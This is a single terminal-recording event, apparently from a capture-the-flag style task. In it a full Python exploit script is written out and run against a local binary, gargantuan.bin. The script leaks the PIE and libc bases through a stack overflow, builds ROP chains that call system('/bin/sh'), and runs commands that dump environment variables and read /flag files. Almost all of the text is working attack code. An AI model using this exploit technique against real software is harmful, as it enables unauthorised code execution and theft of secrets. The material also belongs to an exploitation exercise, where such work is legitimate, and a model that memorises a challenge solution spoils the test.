[687.419533, "i", "cat << 'EOF' > /app/exploit_fixed.py\nimport os, subprocess, struct, time, select\ndef p64(x): return struct.pack('<Q', x)\ndef u64(x): return struct.unpack('<Q', x.ljust(8, b'\\x00'))[0]\np = subprocess.Popen(['/app/gargantuan.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\ndef read_until(token):\n    out = b''\n    while token not in out:\n        c = os.read(p.stdout.fileno(), 1)\n        if not c: break\n        out += c\n    return out\nprefix = (b'\\x41' * 256 + b'\\x00' + b'\\x41' * 255) * 4\nread_until(b'Enter your input below:\\n')\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + b'\\xd9')\np.stdin.flush()\nread_until(b'OO LATE! ')\nleak_str = b''\nwhile True:\n    c = os.read(p.stdout.fileno(), 1)\n    if c == b'\\n': break\n    leak_str += c\npie_base = int(leak_str.decode(), 16) - 0x11e5\nread_until(b'Enter your input below:\\n')\nrop1 = p64(pie_base + 0x11e0) + p64(pie_base + 0x4000) + p64(pie_base + 0x1030) + p64(pie_base + 0x12d9)\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + rop1)\np.stdin.flush()\nread_until(b'OO LATE! ')\nread_until(b'\\n')\nputs_leak = u64(os.read(p.stdout.fileno(), 6))\nlibc_base = puts_leak - 0x80e50\nread_until(b'Enter your input below:\\n')\nrop2 = p64(pie_base + 0x11e0) + p64(libc_base + 0x1d8678) + p64(pie_base + 0x11e1) + p64(libc_base + 0x50d70)\np.stdin.write(prefix + b'\\x00' + b'\\x41' * 295 + rop2)\np.stdin.flush()\nread_until(b'OO LATE! ')\nread_until(b'\\n')\np.stdin.write(b\"echo EXPLOIT_SUCCESS; env; ls -la /; cat /flag* 2>/dev/null\\n\")\np.stdin.flush()\ntime.sleep(0.5)\nwhile True:\n    rx, _, _ = select.select([p.stdout], [], [], 0.5)\n    if rx:\n        out = os.read(p.stdout.fileno(), 4096)\n        if not out: break\n        print(out.decode(errors='ignore'), end='')\n    else: break\nEOF\npython3 /app/exploit_fixed.py\n"]
